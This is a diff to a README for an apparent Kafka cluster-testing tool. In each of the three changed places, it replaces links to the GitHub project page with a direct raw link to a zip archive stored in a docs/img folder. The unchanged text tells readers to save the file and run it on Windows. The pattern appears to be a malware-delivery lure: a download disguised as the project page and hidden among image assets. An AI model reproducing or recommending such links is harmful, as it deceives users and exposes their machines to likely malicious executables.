@@ -1,6 +1,6 @@
 # 🐞 kafka-cluster-testing - Validate Kafka clusters with confidence
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue.svg)](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue.svg)](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)
 
 ## 🚀 Overview
 
@@ -32,7 +32,7 @@ If your team gave you a server name, port, user name, or ticket setup, keep that
 
 Visit this page to download:
 
-[Open kafka-cluster-testing on GitHub](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
+[Open kafka-cluster-testing on GitHub](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)
 
 On that page, look for the latest release or the main download file. Save it to your computer before you run it.
 
@@ -210,6 +210,6 @@ The project topics include:
 
 If you need to get the app again, use this page:
 
-[https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing](https://github.com/sparbuoygenuslagothrix662/kafka-cluster-testing)
+[https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)
 
 Open the page, find the latest download, save it to your PC, and run it on Windows
